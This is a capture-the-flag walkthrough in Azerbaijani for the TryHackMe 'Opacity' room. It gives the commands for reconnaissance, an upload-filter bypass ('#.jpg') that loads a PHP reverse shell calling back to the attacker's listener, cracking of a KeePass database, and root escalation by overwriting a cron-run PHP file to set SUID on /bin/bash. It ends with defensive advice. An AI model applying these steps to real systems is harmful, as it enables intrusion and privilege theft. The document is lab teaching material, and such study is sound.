# TryHackMe — Opacity | Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** [Opacity](https://tryhackme.com/room/opacity)  
**Çətinlik:** Asan  
**Kateqoriya:** Boot2Root, File Upload, Privilege Escalation  
**Müəllif:** ramin  

---

## 📋 Ümumi Baxış

Opacity — pentesterlər və kibertəhlükəsizlik həvəskarları üçün hazırlanmış Boot2Root CTF-dir. Məqsəd iki flag tapmaq:
- `local.txt` — istifadəçi flaqı
- `proof.txt` — root flaqı

---

## 🔍 Mərhələ 1 — Kəşfiyyat (Reconnaissance)

### Port Skanı

```bash
nmap -sV -sC -p- 10.82.186.31 --min-rate 5000
```

**Nəticə:**

| Port | Xidmət | Qeyd |
|------|--------|------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache 2.4.41 |
| 139 | SMB | Samba |
| 445 | SMB | Samba |

### SMB Yoxlaması

```bash
smbclient -L //10.82.186.31 -N
enum4linux -a 10.82.186.31
```

**Nəticə:** Yalnız standart `print$` və `IPC$` — faydalı məlumat yoxdur.

### Veb Direktori Skanı

```bash
gobuster dir -u http://10.82.186.31 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Nəticə:** `/cloud` direktorisi tapıldı!

---

## 💥 Mərhələ 2 — İstismar (Exploitation)

### File Upload Bypass

`http://10.82.186.31/cloud/storage.php` səhifəsində **IMAGE LINK** sahəsi var. Server yalnız şəkil fayllarını qəbul edir — amma `#.jpg` extensionu ilə bypass edilir!

**Niyə işləyir:**
```
http://IP/rev.php#.jpg
                  ↑
        # — brauzer bu hissəni
        serverə göndərmir!
        Server faylı .php kimi icra edir
```

### Reverse Shell Hazırlamaq

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/Desktop/rev.php
nano /home/kali/Desktop/rev.php
# $ip = 'VPN_IP';  dəyişin
# $port = 1234;
```

### Python Server Açmaq

```bash
cd /home/kali/Desktop
python3 -m http.server 8080
```

### Listener Açmaq

```bash
nc -lvnp 1234
```

### Shell Almaq

IMAGE LINK sahəsinə yazın:
```
http://VPN_IP:8080/rev.php#.jpg
```

Submit basın — shell gəldi!

```
www-data@ip-10-82-186-31:/$ 
```

### Shell Stabil Etmək

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

---

## 🔑 Mərhələ 3 — KeePass Şifrəsi

### KeePass Faylını Tapmaq

```bash
find / -name "*.kdbx" 2>/dev/null
# /opt/dataset.kdbx
```

### Faylı Kali-yə Köçürmək

Shell-də:
```bash
cat /opt/dataset.kdbx | base64
```

Kali-də:
```bash
echo "BASE64_METN" | base64 -d > /home/kali/Desktop/dataset.kdbx
```

### Şifrəni Tapmaq

```bash
keepass2john /home/kali/Desktop/dataset.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Nəticə:** `741852963`

### KeePass-ı Açmaq

```bash
kpcli --kdb=/home/kali/Desktop/dataset.kdbx
# Şifrə: 741852963

kpcli:/> cd Root
kpcli:/Root> show -f 0
# sysadmin şifrəsi görünür
```

---

## 🚀 Mərhələ 4 — Sysadmin Girişi

```bash
ssh sysadmin@10.82.186.31
# Şifrə: KeePass-dan tapılan şifrə
```

### Scripts Qovluğunu Yoxlamaq

```bash
cat /home/sysadmin/scripts/script.php
```

**Nəticə:**
```php
<?php
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
// Həmçinin /cloud/images qovluğunu təmizləyir
?>
```

Bu script **root** tərəfindən cronjob ilə işlədilir!

---

## ⬆️ Mərhələ 5 — Privilege Escalation

### backup.inc.php-ni Dəyişmək

```bash
# Köhnə faylı silin:
rm /home/sysadmin/scripts/lib/backup.inc.php
# yes yazın

# Zərərli kod yazın:
echo '<?php system("chmod +s /bin/bash"); ?>' > \
  /home/sysadmin/scripts/lib/backup.inc.php
```

### Cronjob-u Gözləmək

```bash
while true; do ls -la /bin/bash; sleep 10; done
```

`-rwsr-xr-x` görünəndə:

```bash
/bin/bash -p
whoami
# root
```

### Flagları Tapmaq

```bash
cat /root/proof.txt   # root flag
cat /home/sysadmin/local.txt  # user flag
```

---

## 🧠 Niyə Bu İşlədi — Texniki İzah

### File Upload Bypass

```
Server yoxlayır: fayl .jpg-dimi?
URL: rev.php#.jpg
Server görür: rev.php (# sonrasını görmür)
Nəticə: .php faylı yüklənir və icra olunur!
```

### Cronjob Privilege Escalation

```
root hər dəqiqə script.php-ni işlədir
    ↓
script.php backup.inc.php-ni çağırır
    ↓
Biz backup.inc.php-ni dəyişdik
    ↓
root bizim kodu icra etdi
    ↓
/bin/bash SUID oldu → root shell!
```

---

## 🗺️ Bütün Prosesin Xəritəsi

```
🎯 Hədəf: 10.82.186.31
        ↓
🔍 Nmap → Port 80, 22, 139, 445
        ↓
🌐 Gobuster → /cloud tapıldı
        ↓
📤 File Upload Bypass → rev.php#.jpg
        ↓
🐚 www-data shell alındı
        ↓
🔐 KeePass tapıldı → şifrə: 741852963
        ↓
👤 SSH → sysadmin girişi
        ↓
📝 backup.inc.php dəyişdirildi
        ↓
⏰ Cronjob işlədi → /bin/bash SUID
        ↓
👑 /bin/bash -p → ROOT!
        ↓
🚩 Flag tapıldı!
```

---

## 📚 Öyrənilən Konsepsiyalar

| Konsepsiya | İzah |
|-----------|------|
| **File Upload Bypass** | `#.jpg` ilə filter aldatmaq |
| **Reverse Shell** | PHP reverse shell ilə uzaqdan giriş |
| **KeePass** | Şifrə meneceri faylından şifrə çıxarmaq |
| **Cronjob Abuse** | Root cronjob-un çağırdığı faylı dəyişmək |
| **SUID Bit** | `/bin/bash -p` ilə root shell almaq |

---

## 🛡️ Müdafiə Üsulları

1. **File Upload** — URL-dən fayl yükləməyi deaktiv edin
2. **Extension Filter** — `#` simvolunu da filtrələyin
3. **Cronjob Təhlükəsizliyi** — cronjob-un çağırdığı faylların icazələrini qoruyun
4. **Minimum İcazə** — `backup.inc.php` yalnız root tərəfindən yazıla bilməlidir

---

## 🏁 Nəticə

Bu CTF-in əsas dərsi: **Fayl yükləmə filterləri yalnız extensiona baxırsa, `#` ilə bypass edilə bilər.** Həmçinin root cronjob-larının çağırdığı faylların icazələri düzgün qurulmalıdır.

**Flags:**
- User: `local.txt` ✅
- Root: `proof.txt` ✅

---

*Writeup: TryHackMe Opacity otağı üçün Azərbaycan dilində hazırlanmışdır.*
